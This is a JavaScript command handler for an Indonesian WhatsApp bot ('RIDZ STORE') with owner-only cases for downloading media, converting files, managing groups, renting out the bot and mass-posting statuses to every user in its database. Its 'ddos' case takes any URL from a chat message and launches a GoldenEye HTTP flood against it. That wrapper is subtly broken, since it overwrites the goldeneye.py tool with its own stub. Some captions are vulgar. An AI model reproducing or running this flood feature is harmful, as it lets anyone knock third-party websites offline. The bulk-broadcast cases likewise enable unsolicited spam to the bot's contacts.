			if (args.length == 0) return reply(`Example: ${prefix + command} https://youtu.be/VDvFcn6icXo`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					Biiofc.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : `silahkan ketik tovn atau to audio untuk merubah nya menjadi audio / vn`})
					})
				.catch(console.error)
			break
case 'vnsw':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply(`masukin text nya yang ada di database listvn`)
var huy = fs.readFileSync(`./database/Audio/${text}.mp3`)
Biiofc.sendMessage('status@broadcast', {audio: huy, mimetype: 'audio/mp4', ptt:true},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break


case 'inisw':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply(`masukin text nya yang ada di database listvn`)
var buu = fs.readFileSync(`./database/Audio/${text}.mp3`)
Biiofc.sendMessage('status@broadcast', {audio: buu, mimetype:'audio/mp4', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6285211724196',
title: `RIDZ STORE`,
sourceUrl: `https://wa.me/6285211724196`, 
thumbnail: thumb}}},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case "buatswvideo":{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
 if (!quoted) throw `Balas video Dengan Caption ${prefix + command}`
if (!/video/.test(mime)) throw `Balas video dengan caption *${prefix + command}*`
const media = await Biiofc.downloadAndSaveMediaMessage(quoted)
Biiofc.sendMessage('status@broadcast', { video: { url: media }}, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case 'swin':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply(`masukin text nya`)
Biiofc.sendMessage('status@broadcast', {
text: `${text}`
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case "buatswimage":{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
 if (!quoted) throw `Balas image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Balas image dengan caption *${prefix + command}*`
const media = await Biiofc.downloadAndSaveMediaMessage(quoted)
Biiofc.sendMessage('status@broadcast', { image: { url: media }}, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case 'buatsw':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let men = [];
for (let x of pengguna) {
men.push(x)
const result = [ x ]
if (!m.quoted && !text) throw 'reply pesan'
if (m.quoted && m.quoted.mtype === 'conversation' && !text) _m = Biiofc.sendMessage('status@broadcast', {
text: m.quoted.text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
if (!m.quoted && text) _m = Biiofc.sendMessage('status@broadcast', {
text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
}
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case 'ffstalk':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!q) return reply(`Example ${prefix+command} 946716486`)
eeh = await ffstalk.ffstalk(`${q}`)
reply(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'ddos': {
    if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
    if (args.length < 1) return reply('Mohon masukkan link');

    const url = args[0];
    const options = `-w 200 -s 1000`;

    const pythonScript = `
import subprocess

command = "python3 goldeneye.py ${url} ${options}"
output = subprocess.getoutput(command)
print(output)
    `;

    const { writeFile, unlink } = require('fs');
    const { spawn } = require('child_process');

    const scriptPath = './goldeneye.py';
    writeFile(scriptPath, pythonScript, (err) => {
        if (err) {
            reply('Terjadi kesalahan saat menulis skrip Python.');
            return;
        }

        const process = spawn('python3', [scriptPath]);

        let output = '';
        let error = '';

        process.stdout.on('data', (data) => {
            output += data.toString();
        });

        process.stderr.on('data', (data) => {
            error += data.toString();
        });

        process.on('close', (code) => {
            unlink(scriptPath, () => {}); // Hapus skrip sementara setelah digunakan

            if (error) {
                reply('Terjadi kesalahan saat menjalankan skrip Python:\n' + error);
            } else {
                reply('Hasil:\n' + output);
            }
        });
    });
}
break
case 'toaud': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await Biiofc.downloadMediaMessage(quoted)
let { toAudio } = require('./freya/converter')
let audio = await toAudio(media, 'mp4')
Biiofc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
case 'tovn': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
reply('*Sabar Cuy Loading*')
let media = await quoted.download()
let { toPTT } = require('./freya/converter')
let audio = await toPTT(media, 'mp4')
Biiofc.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6285211724196',
title: `RIDZ STORE`,
sourceUrl: `https://wa.me/6285211724196`, 
thumbnail: thumb
}
}})
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
  let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
  if (!/image/.test(mime)) throw respond
  if (!text) throw respond
  reply(`Proses Tuan...`)
  let atas = text.split('|')[0] ? text.split('|')[0] : '-'
  let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
  let { TelegraPh } = require('./freya/uploader')
  try {
  let mee = await Biiofc.downloadAndSaveMediaMessage(quoted)
  let mem = await TelegraPh(mee)
  let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
  let awikwok = await Biiofc.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
  await fs.unlinkSync(awikwok)
  } catch (e) {
  reply(`Sedang Maintenance Tuan`)
  }
  }
  break 

case  'ambilfitur':
            try{
                if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                if (!q) return m.reply(`🚩 Example ${prefix + command} listmenu`)
                let nana = await getCase(q)
                m.reply(nana)
            } catch(err){
            console.log(err)
            m.reply(`🚩 Case ${q} tidak di temukan`)
        }
        break
case 'togif': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./freya/uploader')
let media = await Biiofc.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Biiofc.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}
break
case 'toimg': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return reply(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await Biiofc.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            Biiofc.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return reply(`Please reply to non animated sticker`)
    }
    break
case 'tomp4': case 'tovideo': {
                if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                if (!quoted) return reply('Reply to Sticker')
                if (!/webp/.test(mime)) return reply(`reply sticker with caption *${prefix + command}*`)
		        let { webp2mp4File } = require('./freya/uploader')
                let media = await Biiofc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await Biiofc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
case 'tourl': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./freya/uploader')
let media = await Biiofc.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'getbio':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await Biiofc.fetchStatus(who)
    reply(bio.status)
  } catch {
    if (text) return reply(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await Biiofc.fetchStatus(who)
      reply(bio.status)
    } catch {
      return reply(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break

case 'tiktokaudio':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./freya/tiktok').Tiktok(q).then( data => {
Biiofc.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'tiktok':{ 
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
require('./freya/tiktok').Tiktok(q).then( data => {
Biiofc.sendMessage(m.chat, { caption: `Sukses, Ini Tuan Video Nya`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'mediafire': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	if (args.length == 0) return reply(`Link Nya Tuan?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The link you provided is invalid`)
	const { mediafireDl } = require('./freya/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 100) return reply('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
reply(`${result4}`)
Biiofc.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'listblock': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	const lisben = "Total Ban: " + banUser.length
	reply(lisben)
	}
	break
case 'delete': case 'del': {
                if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                if (!m.quoted) return false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return Reply('Pesan tersebut bukan dikirim oleh bot!')
                Biiofc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'closetime': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
Biiofc.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
}
break
case 'opentime': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
Biiofc.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
}
break
case  'getcase':
const getCase = (cases) => {
         return "case  "+`'${cases}'`+fs.readFileSync("./appearance.js").toString().split('case \''+cases+'\'')[1].split("break")
}
break           
case 'totag': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isBotAdmins) return reply(mess.only.badmin)
               if (!m.quoted) return reply(`Reply message with caption ${prefix + command}`)
               Biiofc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
case 'addip': case 'addpm2':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (args.length !== 1) {
return reply('Format penggunaan salah. Contoh: !addpm2 <ip>');
}
const ipValue = args[0];
const apiUrl = 'https://cekilhost.net/api/config';
axios.post(apiUrl, `ip=${ipValue}`)
.then(response => {
if (response.data.status === 'success') {
const successMessage = `Berhasil Mendaftar pm2 dengan IP: ${ipValue}`;
reply(successMessage);
} else {
const errorMessage = 'Terjadi kesalahan: ' + response.data.message;
reply(errorMessage);
}
})
.catch(error => {
console.error(error);
reply('Terjadi kesalahan saat mengirim permintaan.');
});
break
case 'sendlinkgc': case 'sendgc': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await Biiofc.groupInviteCode(from)
Biiofc.sendText(bnnd, `Order  Akses Bot? Join Gc\nhttps://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
sukses(from)
}
  break
case 'getpm2':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/pm2.json'), caption: 'Egg Pm2', mimetype: 'application/json', fileName: 'pm2.json'}, {quoted: m})
break
case 'getbot':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/Bot.json'), caption: 'Egg Bot', mimetype: 'application/json', fileName: 'Bot.json'}, {quoted: m})
break
case 'ambilcase':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/memek.js'), caption: 'Nih Kalo Mau Deck😜', mimetype: 'application/js', fileName: 'memek.js'}, {quoted: m})
break
case 'ambilsc1':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/Free1.zip'), caption: 'Nih Sc Nya, Dijual Yapit Kontol.', mimetype: 'application/zip', fileName: 'Free1.zip'}, {quoted: m})
break
case 'ambilsc2':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/Free2.zip'), caption: 'Nih Sc Nya, Dijual Yapit Kontol.', mimetype: 'application/zip', fileName: 'Free2.zip'}, {quoted: m})
break
case 'ambilsc3':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/Free3.zip'), caption: 'Nih Sc Nya, Dijual Yapit Kontol.', mimetype: 'application/zip', fileName: 'Free3.zip'}, {quoted: m})
break
case 'ambilsc4':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/Free4.zip'), caption: 'Nih Sc Nya, Dijual Yapit Kontol.', mimetype: 'application/zip', fileName: 'Free4.zip'}, {quoted: m})
break
case 'ambilsc5':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/Free5.zip'), caption: 'Nih Sc Nya, Dijual Yapit Kontol.', mimetype: 'application/zip', fileName: 'Free5.zip'}, {quoted: m})
break
case 'ambilsc6':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/Free6.zip'), caption: 'Nih Sc Nya, Dijual Yapit Kontol.', mimetype: 'application/zip', fileName: 'Free6.zip'}, {quoted: m})
break
case 'vidowner1':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let tekssss = `*Hallo Tuan*👋🏻
Video Diatas Adalah Cewe Idaman 
*${namaStore}*
`
Biiofc.sendMessage(from, { video: fs.readFileSync(`./testimoni/video.mp4`),
 caption: tekssss, 
footer: `MILIK *${ownerStore}*`},
{quoted: fkontak})
}
break
case 'pesan': case 'buyer': {
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
if (!args || !args[0]) return reply(`🚩 Please enter the message\nExample of Use: ${prefix + command} ${owner} pesan untuknya`)
let ngen = ['|']
if (args[0].includes(ngen)) return reply('Replace Symbol | So spaces')
if (args[0].length > 14) return reply('Extension Number')
if (args[0].length < 7) return reply('Abbreviation Number')
if (args[0].startsWith('0')) return reply('Use format 62')
if (!args[0]) return reply('Masukkan Teks')
let mention = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[0] ? (args[0].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
let txt = (args.length > 1 ? args.slice(1).join(' ') : '') || ''
let q = m.quoted ? m.quoted : m
let mime = (q.m || q).mimetype || ''
let tujuan = `${txt}`
if (!m.quoted) {
Biiofc.sendText(mention, tujuan)
} else {
Biiofc.sendText(mention, tujuan)
let media = q ? await m.getQuotedObj() : false || m
await Biiofc.copyNForward(mention, media, false).catch(_ => _)
}
let suks = `Mengirim Pesan *${mime ? mime : 'Teks'}*
*_Success ✅_*

Text :
${txt}
`
Biiofc.sendMessage(m.chat, { text: `${suks}`, mentions: [suks] }, { quoted: m })

}
break
             case 'listonline': case 'liston': {
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    Biiofc.sendText(m.chat, 'List Online:\n\n' + online.map(v => '• @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
  
   
                break
  case 'randomcecan1':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
  reply(`_Tunggu Sebentar Tuan Sedang Kami Proses⏳_`)
  buffer = await getBuffer('https://c.top4top.io/m_26649xrwy1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan2':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://b.top4top.io/m_27832zh400.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan3':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://g.top4top.io/m_2783uxoa40.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan4':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://b.top4top.io/m_26628tg3t1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan5':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://k.top4top.io/m_26648pl8c1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan6':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662wywyl1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan7':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_26627pr7n1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan8':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662rdkb01.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan9':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_2662l0ljt1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan10':{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://i.top4top.io/m_26628j9e61.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
break
case 'sewabot':
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!text) return reply(`*Contoh* :\n#sewabot 1 minggu `)
let cret = await Biiofc.groupCreate(args.join(" "), [])
let response = await Biiofc.groupInviteCode(cret.id)
Biiofc.sendMessage(m.chat, { text: `「 *Create Group Sewa* 」

Sewa Bot Selama *${text}* Sedang Dalam Prosess Silahkan Masuk Melalui Link Group Yang Sudah Di Sediakan..

_▸ Owner : ${namaCreator}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})
reply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break
case 'buysewa':
reply(`¥ *Price Sewa Bot RIDZ STORE* €

🔏 3 hari = 15k
🔏 1 minggu = 25k
🔏 2 minggu = 35k
🔏 1 bulan = 50k

Untuk Melanjutkan Sewa Silahkan Ketik Contoh Di bawah
*Contoh => sewabot 1 minggu`)
break
case'promoteall':
if (!isOwner) return reply('*Khusus RIDZ STORE Doang Woii!!*')
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.groupParticipantsUpdate(from, mems, 'promote')
break
case'demoteall':
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.groupParticipantsUpdate(from, mems, 'demote')
break
	case 'setppbot': case 'setbotpp': {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!quoted) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (!/image/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var medis = await Biiofc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await Biiofc.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`*Success Tuan Ku✅*`)
} else {
var memeg = await Biiofc.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`*Success Tuan Ku✅*`)
}
}
break
case 'setppgroup': {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!quoted) return reply(`*Where is the picture?*`)
if (!/image/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await Biiofc.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await Biiofc.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
reply(`*Success Tuan Ku✅*`)
} else {
var memeg = await Biiofc.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
reply(`*Success Tuan Ku✅*`)
}
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
    await Biiofc.removeProfilePicture(from)
    }
    break
case 'donasi':{
let tekssss = `MAU DONASI BANG ?😁
SILAHKAN SCAN QRIS DI BAWAH
qris : https://telegra.ph/file/dfba6f9e0515da8fc4371.jpg
${grup}
YTB : 
${youtube}
`
Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/donasi.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2022`},
{quoted: fkontak})
}
break
case 'testi1':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 1)
`
Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_1.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi2':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 2)
`
Biiofc.sendMessage(from, { image: fs.readFileSync(`./testimoni/testimoni_2.jpg`),
 caption: tekssss, 
footer: `${ownerStore} © 2023`},
{quoted: fkontak})
}
break
case 'testi3':{
let tekssss = `𝗛𝗮𝗹𝗹𝗼 𝗸𝗮𝗸👋🏻
Gambar di atas adalah testimoni Dari *${namaStore}*

Untuk Nominal transaksi bisa cek di atas ya kak..

Yang pasti *${namaStore}* adalah store paling amanah dan terpercaya✨

(Testimoni ke 3)
`
